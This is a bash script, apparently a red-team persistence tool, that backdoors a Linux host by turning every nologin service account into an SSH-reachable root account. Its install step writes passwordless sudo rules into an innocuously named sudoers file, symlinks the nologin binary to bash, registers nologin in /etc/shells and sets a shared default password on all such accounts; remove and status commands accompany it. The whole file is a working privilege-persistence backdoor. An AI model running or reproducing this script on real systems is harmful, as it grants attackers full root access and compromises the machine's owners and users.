#!/usr/bin/env bash
# infinite-users.sh — hijack all nologin service accounts for SSH access
#
# Usage:
#   sudo ./infinite-users.sh install [password]
#   sudo ./infinite-users.sh remove
#   sudo ./infinite-users.sh status

set -euo pipefail

GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; RED='\033[0;31m'; NC='\033[0m'
info() { echo -e "${GREEN}[+]${NC} $*"; }
warn() { echo -e "${YELLOW}[!]${NC} $*"; }
hdr()  { echo -e "\n${CYAN}── $* ──${NC}"; }
require_root() { [[ $EUID -eq 0 ]] || { echo -e "${RED}[!]${NC} Run as root"; exit 1; }; }

NLOGIN_LOC=$(command -v nologin 2>/dev/null || echo "/usr/sbin/nologin")
BASH_LOC=$(command -v bash)

cmd_install() {
    require_root
    local PASS="${1:-rt2025\!delta}"

    hdr "1/4  Granting sudo to all nologin accounts"
    getent passwd | awk -F: '$7 ~ /nologin/ {print $1 " ALL=(ALL) NOPASSWD: ALL"}' \
        > /etc/sudoers.d/sysupdated
    chmod 440 /etc/sudoers.d/sysupdated
    local count
    count=$(wc -l < /etc/sudoers.d/sysupdated)
    info "Wrote $count sudoers entries to /etc/sudoers.d/sysupdated"

    hdr "2/4  Symlinking nologin -> bash"
    if [[ -L "$NLOGIN_LOC" ]]; then
        warn "Already a symlink: $NLOGIN_LOC -> $(readlink "$NLOGIN_LOC")"
    else
        cp "$NLOGIN_LOC" "${NLOGIN_LOC}.orig"
        rm -f "$NLOGIN_LOC"
        ln -s "$BASH_LOC" "$NLOGIN_LOC"
        info "Symlinked $NLOGIN_LOC -> $BASH_LOC (backup: ${NLOGIN_LOC}.orig)"
    fi

    hdr "3/4  Registering nologin as valid shell in /etc/shells"
    grep -qxF "$NLOGIN_LOC" /etc/shells || { echo "$NLOGIN_LOC" >> /etc/shells; info "Added $NLOGIN_LOC to /etc/shells"; }
    [[ "$NLOGIN_LOC" != "/sbin/nologin" ]] && \
        { grep -qxF "/sbin/nologin" /etc/shells || { echo "/sbin/nologin" >> /etc/shells; info "Added /sbin/nologin to /etc/shells"; }; }

    hdr "4/4  Setting password '$PASS' on all nologin accounts"
    local pwcount=0
    while IFS= read -r u; do
        echo "${u}:${PASS}" | chpasswd 2>/dev/null && (( pwcount++ )) || warn "chpasswd failed for $u"
    done < <(getent passwd | awk -F: '$7 ~ /nologin/ {print $1}')
    info "Password set on $pwcount accounts"

    echo
    info "=== Done ==="
    info "SSH as any of these accounts with password: $PASS"
    info "All accounts have full NOPASSWD sudo"
    info "Example: ssh www-data@<target>  (password: $PASS)"
}

cmd_remove() {
    require_root

    hdr "Restoring nologin binary"
    if [[ -f "${NLOGIN_LOC}.orig" ]]; then
        rm -f "$NLOGIN_LOC"
        mv "${NLOGIN_LOC}.orig" "$NLOGIN_LOC"
        info "Restored $NLOGIN_LOC from backup"
    elif [[ -L "$NLOGIN_LOC" ]]; then
        rm -f "$NLOGIN_LOC"
        # reinstall from package as fallback
        if command -v dpkg-query &>/dev/null; then
            local pkg
            pkg=$(dpkg-query -S "$NLOGIN_LOC" 2>/dev/null | cut -d: -f1 || true)
            [[ -n "$pkg" ]] && apt-get install -y --reinstall "$pkg" -qq 2>/dev/null \
                && info "Reinstalled $NLOGIN_LOC via apt" \
                || warn "Could not reinstall — $NLOGIN_LOC removed but not restored"
        else
            warn "No backup and no apt — $NLOGIN_LOC removed but not restored"
        fi
    else
        warn "nologin at $NLOGIN_LOC is not a symlink — nothing to restore"
    fi

    hdr "Removing sudoers entry"
    if [[ -f /etc/sudoers.d/sysupdated ]]; then
        rm -f /etc/sudoers.d/sysupdated
        info "Removed /etc/sudoers.d/sysupdated"
    else
        warn "/etc/sudoers.d/sysupdated not found"
    fi

    hdr "Removing nologin from /etc/shells"
    sed -i '\|nologin|d' /etc/shells
    info "Removed nologin entries from /etc/shells"

    echo
    info "=== Removed ==="
    warn "Passwords on service accounts are unchanged — chpasswd them manually if needed"
}

cmd_status() {
    hdr "nologin binary"
    if [[ -L "$NLOGIN_LOC" ]]; then
        info "HIJACKED  $NLOGIN_LOC -> $(readlink -f "$NLOGIN_LOC")"
    else
        warn "NOT hijacked  $NLOGIN_LOC is a real binary"
    fi

    hdr "/etc/shells (nologin entries)"
    if grep -q "nologin" /etc/shells 2>/dev/null; then
        info "PRESENT"
        grep "nologin" /etc/shells
    else
        warn "NOT present — sshd will reject nologin-shell accounts"
    fi

    hdr "Sudoers"
    if [[ -f /etc/sudoers.d/sysupdated ]]; then
        local n
        n=$(wc -l < /etc/sudoers.d/sysupdated)
        info "PRESENT  /etc/sudoers.d/sysupdated  ($n accounts)"
    else
        warn "NOT present — /etc/sudoers.d/sysupdated missing"
    fi

    hdr "Hijacked accounts (sample)"
    getent passwd | awk -F: '$7 ~ /nologin/ {print "  " $1 "\t" $7}' | head -10
    local total
    total=$(getent passwd | awk -F: '$7 ~ /nologin/' | wc -l)
    info "Total nologin accounts: $total"
}

CMD="${1:-help}"
shift || true
case "$CMD" in
    install) cmd_install "$@" ;;
    remove)  cmd_remove       ;;
    status)  cmd_status       ;;
    *)
        echo "Usage: sudo $0 {install|remove|status} [password]"
        echo
        echo "  install [pass]  Hijack all nologin accounts (default pass: rt2025!delta)"
        echo "  remove          Restore nologin binary + remove sudoers entry"
        echo "  status          Show hijack state, /etc/shells, sudoers"
        ;;
esac
